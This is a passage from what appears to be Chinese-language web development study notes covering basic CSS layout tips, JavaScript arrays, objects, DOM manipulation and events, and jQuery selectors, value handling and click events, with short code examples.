<li>body标签默认有个边距，导致四边有间隙，去掉间隙<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">	<span class="attribute">margin</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>区域居中, 需要先设置一个宽度, 再margin-left:auto;margin-right:auto<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.c1</span> &#123;</span><br><span class="line">	<span class="attribute">width</span>: <span class="number">1000px</span>;</span><br><span class="line">	<span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>如果存在float, 需要添加<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>a标签是行内标签，行内标签高度，内外边距设置，默认是无效的，需要display:inline-block;<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">	<span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure></li>
<li>a标签去掉下划线<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">	<span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1><span id="javascript">JavaScript</span></h1><ul>
<li>JS是一门编程语言，浏览器就是JS语言的解释器</li>
</ul>
<h2><span id="js写哪">JS写哪</span></h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>导入其他JS文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;static/test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">	func()</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="案例">案例</span></h2><p>利用JS，实现滚动显示”欢迎各位领导”</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;txt&quot;</span>&gt;</span>欢迎各位领导<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		    <span class="keyword">var</span> tag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;txt&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		    <span class="keyword">var</span> str = tag.<span class="property">innerText</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> firstChar = str[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> otherStr = str.<span class="title function_">substring</span>(<span class="number">1</span>, str.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> newsStr = otherStr + firstChar</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(newsStr)</span></span><br><span class="line"><span class="language-javascript">            tag.<span class="property">innerText</span> = newsStr</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// JS中定时器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setInterval</span>(show, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="数组">数组</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 定义数组</span><br><span class="line">var v1 = [11,22,33];</span><br><span class="line">var v2 = Array([11,22,33]);</span><br><span class="line"></span><br><span class="line">v1.push(&#x27;java&#x27;);	// 尾部追加</span><br><span class="line">v1.unshift(&#x27;hello&#x27;);	// 头部追加</span><br><span class="line"></span><br><span class="line">// 循环</span><br><span class="line">for (var idx in v1) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">for (var i=0; i &lt; v1.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>案例：动态创建标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.menus</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.menus</span> <span class="selector-class">.header</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: gold;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> cities = [<span class="string">&quot;BeiJing&quot;</span>, <span class="string">&quot;ShangHai&quot;</span>, <span class="string">&quot;ShenZhen&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> idx <span class="keyword">in</span> cities) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> text = cities[idx];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> tag = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            tag.<span class="property">innerText</span> = text;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> parentTag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;city&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            parentTag.<span class="title function_">appendChild</span>(tag);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="字典">字典</span></h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">info = &#123;</span><br><span class="line">	<span class="string">&quot;name&quot;</span>: <span class="string">&#x27;Tony&#x27;</span>,</span><br><span class="line">	<span class="string">&quot;age&quot;</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get,set</span></span><br><span class="line">info.<span class="property">age</span></span><br><span class="line">info.<span class="property">name</span> = <span class="string">&#x27;Jack&#x27;</span></span><br><span class="line">info[<span class="string">&#x27;age&#x27;</span>]</span><br><span class="line">info[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"><span class="keyword">delete</span> info[<span class="string">&#x27;age&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> info) &#123;</span><br><span class="line">	value = info[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>案例：动态表</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>Age<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">tbody</span> <span class="attr">id</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> info = &#123;<span class="attr">id</span>:<span class="number">1</span>,<span class="attr">name</span>:<span class="string">&quot;Peter&quot;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> tr = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;tr&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> info) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> text = info[key];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> td = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;td&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            td.<span class="property">innerText</span> = text;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            tr.<span class="title function_">appendChild</span>(td);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> tb = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;body&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        tb.<span class="title function_">appendChild</span>(tr);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<h2><span id="条件语句">条件语句</span></h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> () &#123;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="函数">函数</span></h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">func</span>()</span><br></pre></td></tr></table></figure>

<h2><span id="dom">DOM</span></h2><p>DOM是一个模块，基于这个模块对HTML标签操作</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据ID获取标签</span></span><br><span class="line"><span class="keyword">var</span> tag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;xx&quot;</span>);</span><br><span class="line"><span class="comment">// 修改标签文本</span></span><br><span class="line">tag.<span class="property">innerText</span> = <span class="string">&quot;yyy&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 添加一个</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> tag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;city&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> newTag = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	tag.<span class="title function_">appendChild</span>(newTag);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="事件的绑定">事件的绑定</span></h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click to add&quot;</span>, <span class="attr">onclick</span>=<span class="string">&quot;addCity()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">addCity</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> newTag = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            newTag.<span class="property">innerText</span> = <span class="string">&quot;liantong&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> parentTag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;city&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            parentTag.<span class="title function_">appendChild</span>(newTag);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1><span id="jquery">JQuery</span></h1><p>JQuery是一个JS的第三方库</p>
<h2><span id="下载并使用jquery">下载并使用JQuery</span></h2><p>官网下载jquery-3.7.1.min.js, 放到static目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://jquery.com/download/</span><br></pre></td></tr></table></figure>

<p>HTML页面中引入JQuery</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;txt&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;static/jquery-3.7.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&quot;#txt&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;Hello Java&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="寻找标签几种选择器">寻找标签(几种选择器)</span></h2><ul>
<li>ID选择器<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;txt&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;txt&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#txt&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li>样式选择器<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>Hello Java<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;c2&quot;</span>&gt;</span>Hello C++<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;.c1&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li>标签选择器<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>Hello Java<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>Hello Java<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;h1&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li>层级选择器<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c2&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;c2&quot;</span>&gt;</span>Zhong Guo Lian Tong<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;.c1 .c2 .a&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2><span id="间接寻找">间接寻找</span></h2><ul>
<li>找兄弟<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>BeiJing<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>ShangHal<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>ShenZhen<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#c1&quot;</span>).<span class="title function_">prev</span>()</span><br><span class="line">$(<span class="string">&quot;#c1&quot;</span>).<span class="title function_">next</span>()</span><br><span class="line">$(<span class="string">&quot;#c1&quot;</span>).<span class="title function_">siblings</span>() <span class="comment">// 找到所有的兄弟</span></span><br></pre></td></tr></table></figure></li>
<li>找父子<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#c1&quot;</span>).<span class="title function_">parent</span>() <span class="comment">// 父亲</span></span><br><span class="line">$(<span class="string">&quot;#c1&quot;</span>).<span class="title function_">children</span>() <span class="comment">// 所有孩子</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2><span id="操作样式">操作样式</span></h2><ul>
<li>addClass</li>
<li>removeClass</li>
<li>hasClass</li>
</ul>
<h2><span id="值的操作">值的操作</span></h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">$(&quot;#c1&quot;).text()</span><br><span class="line">$(&quot;#c1&quot;).text(&quot;休息&quot;)</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>, <span class="attr">id</span>=<span class="string">&quot;c2&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#c2&quot;</span>).<span class="title function_">val</span>()</span><br><span class="line">$(<span class="string">&quot;#c2&quot;</span>).<span class="title function_">val</span>(<span class="string">&quot;HAHAHA&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>案例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ui</span> <span class="attr">id</span>=<span class="string">&quot;view&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ui</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;txtUser&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;txtEmail&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Email&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getInfo()&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;static/jquery-3.7.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> user = $(<span class="string">&quot;#txtUser&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> email = $(<span class="string">&quot;#txtEmail&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> li = $(<span class="string">&quot;&lt;li&gt;&quot;</span>).<span class="title function_">text</span>(user + <span class="string">&#x27; &#x27;</span> + email);</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;#view&quot;</span>).<span class="title function_">append</span>(li);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="事件">事件</span></h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ui</span> <span class="attr">id</span>=<span class="string">&quot;view&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Baidu<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Google<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ui</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;static/jquery-3.7.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&quot;li&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="variable language_">this</span>).<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当页面框架加载完成后, 立刻执行</p>
